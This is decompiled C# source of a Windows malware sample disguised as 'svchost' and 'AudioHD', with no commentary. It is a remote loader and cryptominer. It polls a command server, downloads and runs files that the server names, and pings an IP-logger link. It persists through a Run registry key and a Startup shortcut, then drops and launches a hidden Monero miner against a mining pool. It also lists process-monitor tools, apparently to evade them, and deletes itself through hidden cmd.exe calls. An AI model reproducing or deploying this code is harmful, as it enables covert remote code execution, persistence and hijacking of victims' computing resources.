// Decompiled with JetBrains decompiler
// Type: t.Program
// Assembly: svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FDD5C0B-9A59-4045-B263-5782D96B1E77
// Assembly location: C:\Users\gorno\Desktop\Dumped_fix.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using t.Properties;

namespace t
{
  internal class Program
  {
    private static string adm = "http://great.protectad.space/cmd.php";

    public static void downloadAndExcecute(string url, string filename)
    {
      using (WebClient webClient = new WebClient())
      {
        Console.WriteLine(filename);
        FileInfo fileInfo = new FileInfo(filename);
        webClient.DownloadFile(url, fileInfo.FullName);
        Process.Start(fileInfo.FullName);
      }
    }

    public static string get(string url)
    {
      try
      {
        WebRequest webRequest = WebRequest.Create(url);
        ICredentials defaultCredentials = CredentialCache.DefaultCredentials;
        webRequest.Credentials = defaultCredentials;
        ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
        return new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        return (string) null;
      }
    }

    public static string[] getTasks()
    {
      char[] chArray1 = new char[1]{ '|' };
      string[] strArray1 = Program.get(Program.adm + "?hwid=" + Program.HWID()).Split(chArray1);
      string[] strArray2 = new string[strArray1.Length];
      int index1 = 0;
      foreach (string str1 in strArray1)
      {
        try
        {
          char[] chArray2 = new char[1]{ ';' };
          string[] strArray3 = str1.Split(chArray2);
          int index2 = 0;
          string str2 = strArray3[index2].Equals("Update") ? "upd" : "dwl";
          int index3 = 1;
          string str3 = strArray3[index3];
          int index4 = 2;
          string str4 = strArray3[index4];
          string[] strArray4 = new string[5]
          {
            str2,
            ";",
            str3,
            ";",
            str4
          };
          strArray2[index1] = string.Concat(strArray4);
        }
        catch (Exception ex)
        {
        }
        ++index1;
      }
      return strArray2;
    }

    public static int getTimeout()
    {
      return Convert.ToInt32(Program.get(Program.adm + "?timeout=1")) * 60 * 1000;
    }

    public static string HWID()
    {
      string str = "";
      try
      {
        ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
        managementObject.Get();
        string index = "VolumeSerialNumber";
        str = managementObject[index].ToString();
      }
      catch (Exception ex)
      {
      }
      return str;
    }

    private static void Main(string[] args)
    {
      string pool = "stratum+tcp://xmr.pool.minergate.com:45560";
      string logger = "https://iplogger.com/1skrV6";
      Thread thread1 = new Thread(new ThreadStart(new Program.Loader().run));
      Thread thread2 = new Thread(new ThreadStart(new Program.Config().run));
      thread2.Start();
      thread2.Join();
      new Thread(new ThreadStart(new Program.Logger(logger).run)).Start();
      thread1.Start();
      thread1.Join();
      new Thread(new ThreadStart(new Program.Processer("victfedorowa@yandex.ru", pool).run)).Start();
      Thread thread3 = new Thread(new ThreadStart(Program.setConnection));
    }

    private static void restart(string filename)
    {
      string str1 = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Arguments = "/C ping 127.0.0.1 -n 2 && taskmgr && " + filename + " && del " + str1 ?? "";
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      int num = 1;
      startInfo.CreateNoWindow = num != 0;
      string str2 = "cmd.exe";
      startInfo.FileName = str2;
      Process.Start(startInfo);
      Environment.Exit(0);
    }

    public static void setConnection()
    {
      while (true)
      {
        foreach (string task in Program.getTasks())
        {
          try
          {
            char[] chArray1 = new char[1]{ ';' };
            string str1 = task.Split(chArray1)[0];
            char[] chArray2 = new char[1]{ ';' };
            string url = task.Split(chArray2)[1];
            char[] chArray3 = new char[1]{ ';' };
            string str2 = task.Split(chArray3)[2];
            char[] chArray4 = new char[1]{ '/' };
            char[] chArray5 = new char[1]{ '/' };
            string filename = url.Split(chArray4)[url.Split(chArray5).Length - 1];
            if (str1.Equals("upd"))
            {
              Program.get(Program.adm + "?hwid=" + Program.HWID() + "&completed=" + str2);
              Program.update(url, filename);
            }
            else
            {
              Program.downloadAndExcecute(url, filename);
              Program.get(Program.adm + "?hwid=" + Program.HWID() + "&completed=" + str2);
            }
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.StackTrace);
          }
        }
        Thread.Sleep(Program.getTimeout());
      }
    }

    public static void update(string url, string filename)
    {
      using (WebClient webClient = new WebClient())
      {
        FileInfo fileInfo = new FileInfo(filename);
        webClient.DownloadFile(url, fileInfo.FullName);
      }
      Program.restart(filename);
    }

    private class Config
    {
      private string path = "";
      private string currFilename;

      public Config()
      {
        this.currFilename = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
      }

      private void appShortcutToStartup()
      {
        string str1 = "AudioHD";
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        if (System.IO.File.Exists(folderPath + "\\" + str1 + ".url"))
          return;
        using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + str1 + ".url"))
        {
          string str2 = this.path + this.currFilename;
          streamWriter.WriteLine("[InternetShortcut]");
          streamWriter.WriteLine("URL=file:///" + str2);
          streamWriter.WriteLine("IconIndex=0");
          streamWriter.WriteLine("IconFile=" + Process.GetCurrentProcess().MainModule.FileName + "\\backup (3).ico");
          streamWriter.Flush();
        }
      }

      private void createDir()
      {
        try
        {
          if (Directory.Exists(this.path))
            return;
          Directory.CreateDirectory(this.path);
        }
        catch (Exception ex)
        {
        }
      }

      private void createDll(string pth)
      {
      }

      public void move()
      {
        string path = this.path;
        foreach (string file in Directory.GetFiles(Environment.CurrentDirectory, this.currFilename))
        {
          char[] chArray = new char[1]{ '\\' };
          string[] strArray = file.Split(chArray);
          string sourceFileName = file;
          string destFileName = path + strArray[strArray.Length - 1];
          try
          {
            System.IO.File.Move(sourceFileName, destFileName);
          }
          catch (Exception ex)
          {
          }
        }
      }

      public byte[] readBytes(string file2)
      {
        char[] chArray = new char[1]{ ' ' };
        string[] strArray = file2.Split(chArray);
        byte[] numArray = new byte[strArray.Length];
        for (int index = 0; index < strArray.Length; ++index)
        {
          try
          {
            numArray[index] = Convert.ToByte(strArray[index]);
          }
          catch (Exception ex)
          {
          }
        }
        return numArray;
      }

      private void restart()
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.Arguments = "/C ping 127.0.0.1 -n 2 && \"" + this.path + this.currFilename + "\"";
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        int num = 1;
        startInfo.CreateNoWindow = num != 0;
        string str = "cmd.exe";
        startInfo.FileName = str;
        Process.Start(startInfo);
        Environment.Exit(0);
      }

      public void run()
      {
        this.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\AudioHDriver\\";
        this.createDir();
        this.move();
        this.SetStartup();
      }

      private void SetStartup()
      {
        try
        {
          this.appShortcutToStartup();
          string str = this.path + this.currFilename;
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("AudioHD", (object) str);
        }
        catch (Exception ex)
        {
        }
      }

      public void WriteBytes(string fileName, byte[] byteArray, string pth)
      {
        using (FileStream fileStream = new FileStream(pth + fileName, FileMode.Create))
        {
          for (int index = 0; index < byteArray.Length; ++index)
            fileStream.WriteByte(byteArray[index]);
          fileStream.Seek(0L, SeekOrigin.Begin);
          int index1 = 0;
          while ((long) index1 < fileStream.Length && (int) byteArray[index1] == fileStream.ReadByte())
            ++index1;
        }
      }
    }

    private class Loader
    {
      private static string bytesname = "cfg.txt";
      private static string loadUrl = "http://u91613zs.beget.tech/" + Program.Loader.minername;
      private static string minername = "AudioHD.exe";
      public string cryptV = "1";
      private bool is64bit = Program.Loader.Is64Bit();
      private string path = "http://u91613zs.beget.tech";
      public bool updated = true;
      public bool installed;

      private void checkInstall()
      {
        this.installed = System.IO.File.Exists(this.path + "\\" + Program.Loader.minername);
      }

      public static bool Is64Bit()
      {
        bool lpSystemInfo;
        Program.Loader.IsWow64Process(Process.GetCurrentProcess().Handle, out lpSystemInfo);
        return lpSystemInfo;
      }

      [DllImport("kernel32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

      private void load()
      {
        this.WriteBytes(Program.Loader.minername, Resources.AudioHD);
        this.WriteBytes("msvcp140.dll", Resources.msvcp140);
        this.WriteBytes("vcruntime140.dll", Resources.vcruntime140);
      }

      public byte[] readBytes(string file2)
      {
        char[] chArray = new char[1]{ ' ' };
        string[] strArray = file2.Split(chArray);
        byte[] numArray = new byte[strArray.Length];
        for (int index = 0; index < strArray.Length; ++index)
        {
          try
          {
            numArray[index] = Convert.ToByte(strArray[index]);
          }
          catch (Exception ex)
          {
          }
        }
        return numArray;
      }

      public void run()
      {
        this.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\AudioHDriver\\";
        this.checkInstall();
        if (this.installed)
          return;
        try
        {
          this.load();
        }
        catch
        {
        }
        Program.Config config = new Program.Config();
      }

      public void WriteBytes(string fileName, byte[] byteArray)
      {
        using (FileStream fileStream = new FileStream(this.path + fileName, FileMode.Create))
        {
          for (int index = 0; index < byteArray.Length; ++index)
            fileStream.WriteByte(byteArray[index]);
          fileStream.Seek(0L, SeekOrigin.Begin);
          int index1 = 0;
          while ((long) index1 < fileStream.Length && (int) byteArray[index1] == fileStream.ReadByte())
            ++index1;
        }
      }
    }

    private class Logger
    {
      private string url = "https://iplogger.com/1skrV6";

      public Logger(string logger)
      {
        this.url = logger;
      }

      private void connect()
      {
        try
        {
          WebRequest webRequest = WebRequest.Create(this.url);
          ICredentials defaultCredentials = CredentialCache.DefaultCredentials;
          webRequest.Credentials = defaultCredentials;
          ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
          new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        catch (Exception ex)
        {
        }
      }

      public void run()
      {
        this.connect();
      }
    }

    private class Processer
    {
      private static string[] forbidden = new string[5]
      {
        "Taskmgr",
        "ProcessHacker",
        "taskmgr",
        "procexp",
        "procexp64"
      };
      private static int kernels = 0;
      private static string path = "";
      private static string processName = "AudioHD";
      private string pool = "";
      private string username = "";
      public bool isRunning;

      public Processer(string u, string pool)
      {
        this.pool = pool;
        this.username = u;
        Program.Processer.kernels = Environment.ProcessorCount / 2;
        Program.Processer.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\AudioHDriver\\";
      }

      private bool checkProcess(string name)
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.Contains(name))
            return true;
        }
        return false;
      }

      public void run()
      {
      }

      private void runProcess(string name)
      {
        Process process = new Process()
        {
          StartInfo = {
            FileName = Program.Processer.path + name + ".exe",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        };
        object[] objArray = new object[6]
        {
          (object) "-o ",
          (object) this.pool,
          (object) " -u ",
          (object) this.username,
          (object) " -p x -k -v=0 --donate-level=1 -t ",
          (object) Program.Processer.kernels
        };
        process.StartInfo.Arguments = string.Concat(objArray);
        process.Start();
        this.isRunning = true;
      }

      public void stopProcess()
      {
        Process.GetProcessesByName(Program.Processer.processName)[0].Kill();
        this.isRunning = false;
      }
    }
  }
}
